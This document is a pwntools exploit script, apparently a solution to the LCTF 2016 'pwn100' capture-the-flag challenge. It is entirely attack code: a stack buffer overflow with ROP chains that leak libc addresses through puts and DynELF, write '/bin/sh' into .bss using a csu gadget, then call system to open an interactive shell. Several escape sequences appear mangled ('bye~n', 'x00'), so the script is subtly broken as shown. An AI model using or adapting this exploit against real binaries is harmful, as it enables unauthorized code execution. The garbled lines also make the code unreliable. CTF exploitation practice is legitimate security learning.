from pwn import *
import binascii
p = process("./lctf16-pwn100")
elf = ELF("./lctf16-pwn100")
readplt = elf.symbols['read']
readgot = elf.got['read']
putsplt = elf.symbols['puts']
putsgot = elf.got['puts']
mainaddress =   0x4006b8
startaddress =   0x400550
poprdi =     0x400763
pop6address  =  0x40075a   
movcalladdress = 0x400740
waddress =     0x601000   
def leak(address):
  count = 0
  data = ''
  payload = "A" * 64 + "A" * 8
  payload += p64(poprdi) + p64(address)
  payload += p64(putsplt)
  payload += p64(startaddress)
  payload = payload.ljust(200, "B")
  p.send(payload)
  print p.recvuntil('bye~n')
  up = ""
  while True:
    c = p.recv(numb=1, timeout=0.5)
    count += 1
    if up == 'n' and c == "":
      data = data[:-1]
      data += "x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data
d = DynELF(leak, elf=ELF('./lctf16-pwn100'))
systemAddress = d.lookup('__libc_system', 'libc')
print "systemAddress:", hex(systemAddress)
print "-----------write /bin/sh to bss--------------"
payload1 = "A" * 64 + "A" * 8
payload1 += p64(pop6address) + p64(0) + p64(1) + p64(readgot) + p64(8) + p64(waddress) + p64(0)
payload1 += p64(movcalladdress)
payload1 += 'x00'*56
payload1 += p64(startaddress)
payload1 =  payload1.ljust(200, "B")
p.send(payload1)
print p.recvuntil('bye~n')
p.send("/bin/shx00")
print "-----------get shell--------------"
payload2 = "A" * 64 + "A" * 8
payload2 += p64(poprdi) + p64(waddress)
payload2 += p64(systemAddress)
payload2 += p64(startaddress)
payload2 =  payload2.ljust(200, "B")
p.send(payload2)
p.interactive()
